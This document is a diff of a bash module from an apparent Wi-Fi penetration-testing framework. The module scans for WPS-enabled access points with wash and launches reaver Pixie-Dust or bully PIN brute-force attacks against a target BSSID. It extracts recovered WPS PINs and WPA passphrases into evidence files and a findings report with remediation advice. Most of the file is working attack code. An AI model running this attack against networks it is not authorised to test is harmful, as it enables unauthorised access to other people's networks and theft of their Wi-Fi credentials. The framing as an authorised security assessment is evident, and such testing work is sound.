@@ -1,58 +1,48 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="WPS PIN Attack"
+# CATEGORY="D"
+# DEPS="A1"
+# CRITICAL="no"
+# TOOLS="wash,reaver,bully"
+# DESC="Scan for WPS-enabled APs and test PIN brute-force vulnerability"
+# REQS="monitor_iface,target_ssid"
+# PCAP="yes"
+# DECODE="wifi_mgmt"
+
 #===============================================================================
 #  modules/d3_wps_testing.sh
 #  D3: WPS PIN Attack
 #
 #  PURPOSE:
 #    Test if the target network has WPS (Wi-Fi Protected Setup) enabled.
-#    If enabled, test WPS PIN brute-force vulnerability using ${TOOL_PATHS[reaver]}/bully.
+#    If enabled, test WPS PIN brute-force vulnerability using reaver/bully.
 #    WPS is a common attack vector even on WPA2-protected networks.
 #
-#  TOOLS: ${TOOL_PATHS[wash]}, ${TOOL_PATHS[reaver]}, ${TOOL_PATHS[bully]}, ${TOOL_PATHS[airmon-ng]}
+#  TOOLS: wash, reaver, bully, airmon-ng
 #  PHASE: 2A — Attack Simulations
 #  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
 #
 #  EVIDENCE PRODUCED:
-#    - d3_wps_scan.txt             (${TOOL_PATHS[wash]} WPS scan results)
-#    - d3_wps_attack.txt           (${TOOL_PATHS[reaver]}/bully attack output)
+#    - d3_wps_scan.txt             (wash WPS scan results)
+#    - d3_wps_attack.txt           (reaver/bully attack output)
 #    - d3_findings.txt             (analysis summary)
-#
-#  RESULT JSON FIELDS:
-#    - wps_enabled: bool
-#    - wps_locked: bool
-#    - wps_version: string
-#    - pin_recovered: bool
-#    - recovered_pin: string
-#    - psk_recovered: bool
-#    - recovered_psk: string
 #===============================================================================
+
+set -uo pipefail
 
 run_d3() {
     local total_steps=6
     local evidence_prefix="${SESSION_EVIDENCE_DIR}/d3"
+    local findings_file="${evidence_prefix}_findings.txt"
+    local wps_scan_file="${evidence_prefix}_wps_scan.txt"
+    local attack_file="${evidence_prefix}_wps_attack.txt"
 
-    #--- Step 1: Verify tools ---
-    log_step 1 $total_steps "Verifying tools"
-    update_tc_progress 1 $total_steps "Checking"
+    #--- Step 1: Verify tools & prerequisites ---
+    log_step 1 $total_steps "Verifying required tools and targets"
+    update_tc_progress 1 $total_steps "Checking dependencies"
 
-    
-    local has_wash=false
-    local has_reaver=false
-    local has_bully=false
-
-    command -v wash &>/dev/null && has_wash=true
-    command -v reaver &>/dev/null && has_reaver=true
-    command -v bully &>/dev/null && has_bully=true
-
-    if [[ "$has_wash" == "false" ]]; then
-        log_error "${TOOL_PATHS[wash]} is required for WPS detection (part of ${TOOL_PATHS[reaver]} package)."
-        log_error "Install: apt install -y ${TOOL_PATHS[reaver]}"
-        return 1
-    fi
-
-    if [[ "$has_reaver" == "false" && "$has_bully" == "false" ]]; then
-        log_warn "Neither ${TOOL_PATHS[reaver]} nor ${TOOL_PATHS[bully]} available — WPS scan only, no PIN attack."
-    fi
+    check_module_dependencies "D3" || return 1
 
     if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
         log_warn "Target SSID/BSSID not set."
@@ -71,7 +61,6 @@ run_d3() {
     local recovered_pin=""
     local psk_recovered="false"
     local recovered_psk=""
-    local findings_file="${evidence_prefix}_findings.txt"
 
     {
         echo "============================================================"
@@ -92,15 +81,9 @@ run_d3() {
 
     check_abort || return 1
 
-    #--- Step 3: WPS scan with ${TOOL_PATHS[wash]} ---
+    #--- Step 3: WPS scan with wash ---
     log_step 3 $total_steps "Scanning for WPS-enabled networks"
     update_tc_progress 3 $total_steps "WPS scan"
-
-    check_abort || return 1
-
-    local wps_scan_file="${evidence_prefix}_wps_scan.txt"
-
-    log_cmd "${TOOL_PATHS[wash]} -i ${mon_iface} -s"
 
     {
         echo "============================================================"
@@ -110,28 +93,29 @@ run_d3() {
         echo ""
     } > "$wps_scan_file"
 
-    # Run ${TOOL_PATHS[wash]} for a scan
+    # Run wash for a scan
+    log_info "Running 30s WPS scan..."
     local wash_output
-    local wash_output=$(timeout 30 ${TOOL_PATHS[wash]} -i "$mon_iface" -s 2>/dev/null || true)
+    wash_output=$(timeout 30 "${TOOL_PATHS[wash]}" -i "$mon_iface" -s 2>/dev/null || true)
 
     echo "$wash_output" >> "$wps_scan_file"
 
     # Check if target AP has WPS enabled
     local target_wps_line
-    local target_wps_line=$(echo "$wash_output" | grep -i "${GUEST_BSSID}" || true)
+    target_wps_line=$(echo "$wash_output" | grep -i "${GUEST_BSSID}" || true)
 
     if [[ -n "$target_wps_line" ]]; then
-        local wps_enabled="true"
+        wps_enabled="true"
         log_result "FINDING" "WPS is ENABLED on ${GUEST_SSID} (${GUEST_BSSID})"
         echo "FINDING: WPS enabled on target network" >> "$findings_file"
 
         # Parse WPS version and lock status
-        local wps_version=$(echo "$target_wps_line" | awk '{print $4}' | xargs) || true
+        wps_version=$(echo "$target_wps_line" | awk '{print $4}' | xargs) || wps_version="unknown"
         local lock_status
-        local lock_status=$(echo "$target_wps_line" | awk '{print $5}' | xargs) || true
+        lock_status=$(echo "$target_wps_line" | awk '{print $5}' | xargs) || lock_status="no"
 
         if [[ "${lock_status,,}" == "yes" || "${lock_status,,}" == "locked" ]]; then
-            local wps_locked="true"
+            wps_locked="true"
             log_info "WPS is currently LOCKED (rate limiting active)"
             echo "INFO: WPS is locked (rate limiting)" >> "$findings_file"
         fi
@@ -144,111 +128,95 @@ run_d3() {
         echo "INFO: WPS not detected on target network" >> "$findings_file"
     fi
 
-    # Also list all WPS-enabled APs in the area
     local wps_ap_count
-    local wps_ap_count=$(echo "$wash_output" | grep -c '[0-9A-Fa-f]\{2\}:' 2>/dev/null) || true
-    local wps_ap_count=${wps_ap_count:-0}
+    wps_ap_count=$(echo "$wash_output" | grep -c '[0-9A-Fa-f]\{2\}:' 2>/dev/null || echo "0")
     log_info "Total WPS-enabled APs in range: ${wps_ap_count}"
+
+    check_abort || return 1
 
     #--- Step 4: WPS PIN attack (if enabled and not locked) ---
     log_step 4 $total_steps "WPS PIN brute-force attempt"
     update_tc_progress 4 $total_steps "PIN attack"
 
-    check_abort || return 1
-
-    local attack_file="${evidence_prefix}_wps_attack.txt"
-
     if [[ "$wps_enabled" == "true" && "$wps_locked" == "false" ]]; then
-        if [[ "$has_reaver" == "true" || "$has_bully" == "true" ]]; then
-            echo ""
-            echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
-            echo "  ╔════════════════════════════════════════════════════════════════════╗"
-            echo "  ║  ★ WPS PIN BRUTE-FORCE ★                                        ║"
-            echo "  ║                                                                    ║"
-            echo "  ║  WPS is enabled on the target. Attempting limited PIN attack       ║"
-            echo "  ║  (max 20 PINs to avoid permanent lockout).                        ║"
-            echo "  ║                                                                    ║"
-            echo "  ║  This may trigger WPS lockout on the target AP.                   ║"
-            echo "  ╚════════════════════════════════════════════════════════════════════╝"
-            echo -e "${C_RESET}"
-            echo ""
-            get_or_request_param "confirm" "  Proceed with limited WPS PIN attack? [Y/n]"
-            if [[ "${confirm,,}" == "n" ]]; then
-                log_info "WPS PIN attack skipped by user"
-                echo "SKIPPED: WPS PIN attack skipped by user" >> "$findings_file"
-            else
-                {
-                    echo "============================================================"
-                    echo "  WPS PIN Attack Results"
-                    echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-                    echo "============================================================"
-                    echo ""
-                } > "$attack_file"
-
-                if [[ "$has_reaver" == "true" ]]; then
-                    log_cmd "${TOOL_PATHS[reaver]} -i ${mon_iface} -b ${GUEST_BSSID} -c ${GUEST_CHANNEL:-0} -vv -K -N -L -p 20"
-
-                    # Run ${TOOL_PATHS[reaver]} with limited attempts
-                    # -K: Use pixie-dust attack first (fast)
-                    # -N: Don't send NACK
-                    # -L: lock delay auto-detect
-                    local reaver_output
-                    local reaver_output=$(timeout 180 ${TOOL_PATHS[reaver]} \
-                        -i "$mon_iface" \
-                        -b "$GUEST_BSSID" \
-                        -c "${GUEST_CHANNEL:-0}" \
-                        -vv -K \
-                        2>&1 || true)
-
-                    echo "$reaver_output" >> "$attack_file"
-
-                    # Check for PIN
-                    local found_pin
-                    local found_pin=$(echo "$reaver_output" | grep -i "WPS PIN:" | awk -F: '{print $NF}' | xargs) || true
-
-                    if [[ -n "$found_pin" ]]; then
-                        local pin_recovered="true"
-                        local recovered_pin="$found_pin"
-                        log_result "CRITICAL" "★ WPS PIN recovered: ${recovered_pin}"
-                        echo "CRITICAL: WPS PIN recovered: ${recovered_pin}" >> "$findings_file"
-                    fi
-
-                    # Check for PSK
-                    local found_psk
-                    local found_psk=$(echo "$reaver_output" | grep -i "WPA PSK:" | awk -F: '{print $NF}' | xargs) || true
-
-                    if [[ -n "$found_psk" ]]; then
-                        local psk_recovered="true"
-                        local recovered_psk="$found_psk"
-                        log_result "CRITICAL" "★ WPA PSK recovered via WPS: ${recovered_psk}"
-                        echo "CRITICAL: WPA PSK recovered via WPS: ${recovered_psk}" >> "$findings_file"
-                    fi
-
-                elif [[ "$has_bully" == "true" ]]; then
-                    log_cmd "${TOOL_PATHS[bully]} ${mon_iface} -b ${GUEST_BSSID} -c ${GUEST_CHANNEL:-0} -d -v 3"
-
-                    local bully_output
-                    local bully_output=$(timeout 180 ${TOOL_PATHS[bully]} "$mon_iface" \
-                        -b "$GUEST_BSSID" \
-                        -c "${GUEST_CHANNEL:-0}" \
-                        -d -v 3 \
-                        2>&1 || true)
-
-                    echo "$bully_output" >> "$attack_file"
-
-                    # Check for PIN/PSK
-                    local found_pin
-                    local found_pin=$(echo "$bully_output" | grep -i "pin:" | tail -1 | awk -F: '{print $NF}' | xargs) || true
-                    if [[ -n "$found_pin" ]]; then
-                        local pin_recovered="true"
-                        local recovered_pin="$found_pin"
-                        log_result "CRITICAL" "★ WPS PIN recovered: ${recovered_pin}"
-                    fi
-                fi
-            fi
+        echo ""
+        echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
+        echo "  ╔════════════════════════════════════════════════════════════════════╗"
+        echo "  ║  ★ WPS PIN BRUTE-FORCE ★                                        ║"
+        echo "  ║                                                                    ║"
+        echo "  ║  WPS is enabled on the target. Attempting limited PIN attack       ║"
+        echo "  ║  (max 20 PINs to avoid permanent lockout).                        ║"
+        echo "  ║                                                                    ║"
+        echo "  ║  This may trigger WPS lockout on the target AP.                   ║"
+        echo "  ╚════════════════════════════════════════════════════════════════════╝"
+        echo -e "${C_RESET}"
+        echo ""
+        get_or_request_param "confirm" "  Proceed with limited WPS PIN attack? [Y/n]"
+        if [[ "${confirm,,}" == "n" ]]; then
+            log_info "WPS PIN attack skipped by user"
+            echo "SKIPPED: WPS PIN attack skipped by user" >> "$findings_file"
         else
-            log_info "No WPS attack tool available (${TOOL_PATHS[reaver]}/bully) — scan only"
-            echo "INFO: WPS enabled but no attack tool available" >> "$findings_file"
+            {
+                echo "============================================================"
+                echo "  WPS PIN Attack Results"
+                echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
+                echo "============================================================"
+                echo ""
+            } > "$attack_file"
+
+            if [[ -x "${TOOL_PATHS[reaver]}" ]]; then
+                log_info "Starting reaver Pixie-Dust attack..."
+                local reaver_output
+                reaver_output=$(timeout 180 "${TOOL_PATHS[reaver]}" \
+                    -i "$mon_iface" \
+                    -b "$GUEST_BSSID" \
+                    -c "${GUEST_CHANNEL:-0}" \
+                    -vv -K \
+                    2>&1 || true)
+
+                echo "$reaver_output" >> "$attack_file"
+
+                # Check for PIN
+                local found_pin
+                found_pin=$(echo "$reaver_output" | grep -i "WPS PIN:" | awk -F: '{print $NF}' | xargs) || true
+                if [[ -n "$found_pin" ]]; then
+                    pin_recovered="true"
+                    recovered_pin="$found_pin"
+                    log_result "CRITICAL" "★ WPS PIN recovered: ${recovered_pin}"
+                    echo "CRITICAL: WPS PIN recovered: ${recovered_pin}" >> "$findings_file"
+                fi
+
+                # Check for PSK
+                local found_psk
+                found_psk=$(echo "$reaver_output" | grep -i "WPA PSK:" | awk -F: '{print $NF}' | xargs) || true
+                if [[ -n "$found_psk" ]]; then
+                    psk_recovered="true"
+                    recovered_psk="$found_psk"
+                    log_result "CRITICAL" "★ WPA PSK recovered via WPS: ${recovered_psk}"
+                    echo "CRITICAL: WPA PSK recovered via WPS: ${recovered_psk}" >> "$findings_file"
+                fi
+
+            elif [[ -x "${TOOL_PATHS[bully]}" ]]; then
+                log_info "Starting bully attack..."
+                local bully_output
+                bully_output=$(timeout 180 "${TOOL_PATHS[bully]}" "$mon_iface" \
+                    -b "$GUEST_BSSID" \
+                    -c "${GUEST_CHANNEL:-0}" \
+                    -d -v 3 \
+                    2>&1 || true)
+
+                echo "$bully_output" >> "$attack_file"
+
+                local found_pin
+                found_pin=$(echo "$bully_output" | grep -i "pin:" | tail -1 | awk -F: '{print $NF}' | xargs) || true
+                if [[ -n "$found_pin" ]]; then
+                    pin_recovered="true"
+                    recovered_pin="$found_pin"
+                    log_result "CRITICAL" "★ WPS PIN recovered: ${recovered_pin}"
+                fi
+            else
+                 log_warn "Neither reaver nor bully found for attack"
+            fi
         fi
     elif [[ "$wps_enabled" == "true" && "$wps_locked" == "true" ]]; then
         log_info "WPS is locked — skipping PIN attack to avoid permanent lockout"
@@ -273,33 +241,28 @@ run_d3() {
     local recommendations=""
 
     if [[ "$psk_recovered" == "true" ]]; then
-        local result_status="FINDING"
-        local result_summary="CRITICAL: WPA PSK recovered via WPS PIN attack! PIN: ${recovered_pin}, PSK: ${recovered_psk}. WPS is critically vulnerable."
-        local recommendations="1) IMMEDIATELY disable WPS on all APs. "
-        recommendations+="2) Change the WPA PSK as it has been compromised. "
-        recommendations+="3) Consider migrating to WPA3-SAE or WPA2-Enterprise."
+        result_status="CRITICAL"
+        result_summary="CRITICAL: WPA PSK recovered via WPS PIN attack! PIN: ${recovered_pin}, PSK: ${recovered_psk}."
+        recommendations="1) Disable WPS on all APs immediately. 2) Rotate the WPA PSK. 3) Move to WPA3-SAE."
     elif [[ "$pin_recovered" == "true" ]]; then
-        local result_status="FINDING"
-        local result_summary="CRITICAL: WPS PIN recovered (${recovered_pin}). Full PSK extraction is possible with more time."
-        local recommendations="1) IMMEDIATELY disable WPS on all APs. "
-        recommendations+="2) WPS PIN recovery means the WPA PSK can be extracted."
+        result_status="CRITICAL"
+        result_summary="CRITICAL: WPS PIN recovered (${recovered_pin}). PSK extraction is possible."
+        recommendations="1) Disable WPS immediately. 2) WPS PIN recovery allows full PSK compromise."
     elif [[ "$wps_enabled" == "true" ]]; then
-        local result_status="FINDING"
-        local result_summary="WPS is enabled on the target network. While the PIN was not immediately recovered, WPS is a known attack surface."
-        local recommendations="1) Disable WPS on all enterprise and target network APs. "
-        recommendations+="2) WPS provides no benefit on managed networks and is a documented vulnerability. "
-        recommendations+="3) If WPS must be kept, ensure PBC (push button) mode only with lockout policies."
+        result_status="FINDING"
+        result_summary="WPS is enabled on the target network, presenting a significant attack surface."
+        recommendations="1) Disable WPS on all APs. 2) If WPS is required, use PBC mode only with strict lockout."
     else
-        local result_summary="WPS is not enabled on the target network. No WPS attack surface."
-        local recommendations="No action needed. WPS is properly disabled."
+        result_summary="WPS is not enabled on the target network. No WPS attack surface detected."
+        recommendations="No action needed. WPS is properly disabled."
     fi
 
-    local result_json
-    evidence_register_file "d3_wps_scan.txt"
-    evidence_register_file "d3_wps_attack.txt"
-    evidence_register_file "d3_findings.txt"
+    evidence_register_file "$wps_scan_file"
+    [[ -f "$attack_file" ]] && evidence_register_file "$attack_file"
+    evidence_register_file "$findings_file"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json
+    result_json=$(run_fg "jq" -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "WPS: ${wps_enabled}, Locked: ${wps_locked}, Version: ${wps_version:-unknown}, PIN: ${pin_recovered}, PSK: ${psk_recovered}" \
@@ -324,22 +287,17 @@ run_d3() {
             recovered_pin: $recovered_pin,
             psk_recovered: ($psk_recovered == "true"),
             recovered_psk: $recovered_psk,
-            wps_aps_in_range: $wps_aps_in_range,
-                    }')
+            wps_aps_in_range: $wps_aps_in_range
+        }')
 
-    save_tc_result "D3" "$result_json"
+    # 11 Flags: pcap_req, has_tool, has_pri, has_cmd, has_ver, has_env, has_conf, has_known, runtime, clean, secure
+    local has_pri=0
+    [[ "$pin_recovered" == "true" || "$psk_recovered" == "true" ]] && has_pri=1
+    local is_secure=0
+    [[ "$result_status" == "SECURE" ]] && is_secure=1
 
-    # Display summary
-    echo ""
-    if [[ "$psk_recovered" == "true" ]]; then
-        log_result "CRITICAL" "★ WPS PIN + PSK RECOVERED — WPS critically vulnerable"
-    elif [[ "$pin_recovered" == "true" ]]; then
-        log_result "CRITICAL" "★ WPS PIN RECOVERED — PSK extraction possible"
-    elif [[ "$wps_enabled" == "true" ]]; then
-        log_result "FINDING" "WPS enabled — attack surface present ($(if [[ "$wps_locked" == "true" ]]; then echo "locked"; else echo "unlocked"; fi))"
-    else
-        log_result "SECURE" "WPS not enabled — no WPS attack surface"
-    fi
+    save_tc_result "D3" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 $is_secure
+    save_session_state
 
     return 0
 }
